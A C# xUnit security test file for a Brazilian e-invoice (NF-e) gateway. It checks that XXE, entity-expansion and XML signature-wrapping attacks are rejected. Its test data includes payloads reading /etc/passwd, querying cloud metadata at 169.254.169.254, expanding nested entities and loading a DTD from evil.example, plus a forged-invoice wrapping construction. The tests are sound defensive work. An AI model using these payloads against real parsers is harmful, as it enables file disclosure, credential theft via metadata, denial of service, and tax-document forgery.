using System.Security.Cryptography.Xml;
using System.Text;
using System.Xml;

using TaxGateway.Infrastructure.Xml;
using TaxGateway.TestKit;

namespace TaxGateway.SecurityTests.Xml;

/// <summary>Critério de saída da Fase 3: XXE e signature wrapping (SDD §4.4, §13).</summary>
public sealed class XmlSecurityTests
{
    private const string Cnpj = "11222333000181";
    private static readonly TestPki Pki = TestPki.LoadOrCreate(Path.Combine(Path.GetTempPath(), "taxgateway-test-pki"));
    private static readonly NfeSignatureVerifier Verifier = new(TrustAnchors.IcpBrasil([Pki.Root]));

    private const string Rtc = """
        <IBSCBS><CST>000</CST><cClassTrib>000001</cClassTrib><gIBSCBS><vBC>1000.00</vBC><gIBSUF><pIBSUF>0.05</pIBSUF><vIBSUF>0.50</vIBSUF></gIBSUF><gIBSMun><pIBSMun>0.05</pIBSMun><vIBSMun>0.50</vIBSMun></gIBSMun><vIBS>1.00</vIBS><gCBS><pCBS>11.20</pCBS><vCBS>112.00</vCBS></gCBS></gIBSCBS></IBSCBS>
        """;
    private const string Tot = """
        <IBSCBSTot><vBCIBSCBS>1000.00</vBCIBSCBS><gIBS><gIBSUF><vDif>0.00</vDif><vDevTrib>0.00</vDevTrib><vIBSUF>0.50</vIBSUF></gIBSUF><gIBSMun><vDif>0.00</vDif><vDevTrib>0.00</vDevTrib><vIBSMun>0.50</vIBSMun></gIBSMun><vIBS>1.00</vIBS><vCredPres>0.00</vCredPres><vCredPresCondSus>0.00</vCredPresCondSus></gIBS><gCBS><vDif>0.00</vDif><vDevTrib>0.00</vDevTrib><vCBS>112.00</vCBS><vCredPres>0.00</vCredPres><vCredPresCondSus>0.00</vCredPresCondSus></gCBS></IBSCBSTot>
        """;

    public static NfeSpec Spec(string modelo = "55") => new(Cnpj, 35, 3550308, "SP", new DateTimeOffset(2027, 6, 15, 10, 0, 0, TimeSpan.FromHours(-3)),
        modelo, 4590, [new NfeItem(1, "84713012", 1000m, 0m, Rtc)], Tot, DestCnpj: "11444777000161");

    private static XmlDocument Signed(NfeSpec? spec = null)
    {
        var doc = NfeBuilder.Build(spec ?? Spec());
        NfeBuilder.Sign(doc, Pki.Leaf);
        return SecureXmlLoader.Load(NfeBuilder.Bytes(doc));   // ida e volta como chega na API
    }

    private static SignatureCheck Verify(XmlDocument doc)
    {
        var p = NfeMapper.Map(doc);
        return Verifier.Verify(p.Nfe, p.InfNFe, p.Document.EmitenteCnpj, p.Document.DataEmissao);
    }

    [Theory]
    [InlineData("55")]
    [InlineData("65")]
    public void Generated_nfe_is_valid_in_the_official_xsd_and_signature_verifies(string modelo)
    {
        var doc = Signed(Spec(modelo));
        var p = NfeMapper.Map(doc);
        Assert.Empty(XmlSecurityCache.Nfe.Validate(p.Nfe));
        var check = Verify(doc);
        Assert.True(check.Valid, check.Detail);
        Assert.Equal(modelo, p.Document.Modelo);
        Assert.True(TaxGateway.Core.Fiscal.AccessKey.IsValid(p.Document.ChaveAcesso));
    }

    [Fact]
    public void Xsd_rejects_invalid_layout()
    {
        var doc = Signed();
        var ns = new XmlNamespaceManager(doc.NameTable);
        ns.AddNamespace("n", NfeBuilder.Ns);
        doc.SelectSingleNode("//n:pCBS", ns)!.InnerText = "abc";
        Assert.NotEmpty(XmlSecurityCache.Nfe.Validate(NfeMapper.Map(doc).Nfe));
    }

    [Theory]
    [InlineData("""<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><NFe xmlns="http://www.portalfiscal.inf.br/nfe">&x;</NFe>""")]
    [InlineData("""<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]><NFe xmlns="http://www.portalfiscal.inf.br/nfe">&x;</NFe>""")]
    [InlineData("""<?xml version="1.0"?><!DOCTYPE l [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;"><!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">]><NFe xmlns="http://www.portalfiscal.inf.br/nfe">&d;</NFe>""")]
    [InlineData("""<?xml version="1.0"?><!DOCTYPE NFe SYSTEM "http://evil.example/nfe.dtd"><NFe xmlns="http://www.portalfiscal.inf.br/nfe"/>""")]
    public void Xxe_and_entity_expansion_are_rejected_before_parsing(string xml)
    {
        var ex = Assert.Throws<XmlRejectedException>(() => SecureXmlLoader.Load(Encoding.UTF8.GetBytes(xml)));
        Assert.Contains("DTD", ex.Message, StringComparison.Ordinal);
    }

    [Fact]
    public void Oversized_document_is_rejected() =>
        Assert.Throws<XmlRejectedException>(() => SecureXmlLoader.Load(NfeBuilder.Bytes(Signed()), maxCharacters: 1000));

    [Fact]
    public void Content_changed_after_signing_is_detected()
    {
        var doc = Signed();
        var ns = new XmlNamespaceManager(doc.NameTable);
        ns.AddNamespace("n", NfeBuilder.Ns);
        doc.SelectSingleNode("//n:gCBS/n:vCBS", ns)!.InnerText = "1.00";
        Assert.Equal(SignatureFailure.AssinaturaInvalida, Verify(doc).Failure);
    }

    [Fact]
    public void Wrapping_with_duplicated_id_is_rejected()
    {
        // Ataque clássico: o infNFe assinado vai para dentro de um Object da assinatura e um infNFe forjado, com o
        // mesmo Id, ocupa o lugar do original. A referência ainda "bate" com o nó escondido.
        var doc = Signed();
        var ns = new XmlNamespaceManager(doc.NameTable);
        ns.AddNamespace("n", NfeBuilder.Ns);
        ns.AddNamespace("ds", SignedXml.XmlDsigNamespaceUrl);
        var nfe = (XmlElement)doc.SelectSingleNode("//n:NFe", ns)!;
        var original = (XmlElement)nfe.SelectSingleNode("n:infNFe", ns)!;
        var forged = (XmlElement)original.CloneNode(true);
        forged.SelectSingleNode(".//n:gCBS/n:vCBS", ns)!.InnerText = "0.01";
        var obj = doc.CreateElement("ds", "Object", SignedXml.XmlDsigNamespaceUrl);
        var sig = (XmlElement)nfe.SelectSingleNode("ds:Signature", ns)!;
        nfe.ReplaceChild(forged, original);
        obj.AppendChild(original);
        sig.AppendChild(obj);
        Assert.Equal(SignatureFailure.Wrapping, Verify(doc).Failure);
    }

    [Fact]
    public void Reference_to_other_element_is_rejected()
    {
        var doc = Signed();
        var ns = new XmlNamespaceManager(doc.NameTable);
        ns.AddNamespace("ds", SignedXml.XmlDsigNamespaceUrl);
        ((XmlElement)doc.SelectSingleNode("//ds:Reference", ns)!).SetAttribute("URI", "#outro");
        Assert.Equal(SignatureFailure.ReferenciaInvalida, Verify(doc).Failure);
    }

    [Fact]
    public void Second_signature_or_reference_is_rejected()
    {
        var doc = Signed();
        var ns = new XmlNamespaceManager(doc.NameTable);
        ns.AddNamespace("n", NfeBuilder.Ns);
        ns.AddNamespace("ds", SignedXml.XmlDsigNamespaceUrl);
        var sig = doc.SelectSingleNode("//ds:Signature", ns)!;
        doc.SelectSingleNode("//n:NFe", ns)!.AppendChild(sig.CloneNode(true));
        Assert.Equal(SignatureFailure.MultiplasAssinaturas, Verify(doc).Failure);

        var doc2 = Signed();
        var si = doc2.SelectSingleNode("//ds:SignedInfo", ns)!;
        si.AppendChild(doc2.SelectSingleNode("//ds:Reference", ns)!.CloneNode(true));
        Assert.Equal(SignatureFailure.ReferenciaInvalida, Verify(doc2).Failure);
    }

    [Fact]
    public void Transform_outside_allowlist_is_rejected()
    {
        var doc = Signed();
        var ns = new XmlNamespaceManager(doc.NameTable);
        ns.AddNamespace("ds", SignedXml.XmlDsigNamespaceUrl);
        ((XmlElement)doc.SelectSingleNode("//ds:Transform[2]", ns)!).SetAttribute("Algorithm", SignedXml.XmlDsigXsltTransformUrl);
        Assert.Equal(SignatureFailure.TransformNaoPermitido, Verify(doc).Failure);
    }

    [Fact]
    public void Certificate_outside_icp_brasil_is_rejected()
    {
        var rogue = TestPki.LoadOrCreate(Path.Combine(Path.GetTempPath(), $"taxgateway-rogue-{Guid.NewGuid():N}"));
        var doc = NfeBuilder.Build(Spec());
        NfeBuilder.Sign(doc, rogue.Leaf);
        Assert.Equal(SignatureFailure.CadeiaNaoConfiavel, Verify(SecureXmlLoader.Load(NfeBuilder.Bytes(doc))).Failure);
    }

    [Fact]
    public void Certificate_of_another_company_is_rejected()
    {
        using var other = TestPki.IssueLeaf(Pki.Root, "99888777000122", new DateTimeOffset(2025, 6, 1, 0, 0, 0, TimeSpan.Zero), new DateTimeOffset(2034, 1, 1, 0, 0, 0, TimeSpan.Zero));
        var doc = NfeBuilder.Build(Spec());
        NfeBuilder.Sign(doc, other);
        Assert.Equal(SignatureFailure.CertificadoNaoCorrespondeEmitente, Verify(SecureXmlLoader.Load(NfeBuilder.Bytes(doc))).Failure);
    }

    [Fact]
    public void Expired_certificate_at_emission_date_is_rejected()
    {
        using var expired = TestPki.IssueLeaf(Pki.Root, Cnpj, new DateTimeOffset(2025, 6, 1, 0, 0, 0, TimeSpan.Zero), new DateTimeOffset(2026, 1, 1, 0, 0, 0, TimeSpan.Zero));
        var doc = NfeBuilder.Build(Spec());   // emitida em 2027
        NfeBuilder.Sign(doc, expired);
        Assert.Equal(SignatureFailure.CadeiaNaoConfiavel, Verify(SecureXmlLoader.Load(NfeBuilder.Bytes(doc))).Failure);
    }

    [Fact]
    public void Unsigned_document_is_reported_as_missing_signature()
    {
        var doc = SecureXmlLoader.Load(NfeBuilder.Bytes(NfeBuilder.Build(Spec())));
        Assert.Equal(SignatureFailure.Ausente, Verify(doc).Failure);
    }

    [Fact]
    public void Real_icp_brasil_roots_are_embedded()
    {
        var anchors = TrustAnchors.IcpBrasil();
        Assert.Equal(5, anchors.Roots.Count);
        Assert.All(anchors.Roots, c => Assert.Contains("ICP-Brasil", c.Subject, StringComparison.Ordinal));
        Assert.True(anchors.Intermediates.Count > 150);
    }
}
